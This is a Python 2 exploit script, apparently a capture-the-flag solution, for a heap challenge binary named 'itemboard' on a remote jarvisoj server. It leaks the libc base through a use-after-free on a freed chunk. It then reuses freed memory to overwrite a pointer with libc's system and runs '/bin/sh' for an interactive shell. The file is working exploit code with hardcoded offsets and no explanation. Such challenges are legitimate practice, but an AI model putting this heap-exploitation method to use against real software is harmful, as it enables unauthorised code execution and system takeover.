#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from struct import unpack
from time import sleep
import sys


#  def DEBUG():
    #  print pidof(io)[0]
    #  raw_input("DEBUG: ")
if sys.argv[1] == 'l':
    conn = './itemboard'
    main_arena = 0x399b00
    sysAddr = 0x3f450
else:
    conn = ('pwn2.jarvisoj.com', 9887)
    main_arena = 0x3be760
    sysAddr = 0x46590

io = zio(conn, timeout = 10000, print_read = COLORED(RAW, 'magenta'), print_write = COLORED(RAW, 'green'))

def add(name, length, des):
    io.read_until(":\n")
    io.writeline("1")
    io.read_until("?\n")
    io.writeline(name)
    io.read_until("?\n")
    io.writeline(str(length))
    io.read_until("?\n")
    io.writeline(des)

def show(idx):
    io.read_until(":\n")
    io.writeline("3")
    io.read_until("?\n")
    io.writeline(str(idx))

def remove(idx):
    io.read_until(":\n")
    io.writeline("4")
    io.read_until("?\n")
    io.writeline(str(idx))

if __name__ == '__main__':
    add('aaaa', 0x80, 'aaaa')
    add('bbbb', 0x80, 'bbbb')
    remove(0)
    show(0)

    libcBase = b64(io.read_until('\x7f')[-6: ].ljust(8, '\x00')[::-1]) - 88 - main_arena
    print "[*]libcBase -> {:#x}".format(libcBase)
    raw_input("")

    add('cccc', 32, 'cccc')
    add('dddd', 32, 'dddd')
    remove(2)
    remove(3)

    add('eeee', 24, '/bin/sh;' + 'eeeeeeee' + l64(libcBase + sysAddr))
    remove(2)

    print "[*]get shell!"
    io.interact()
    io.close()

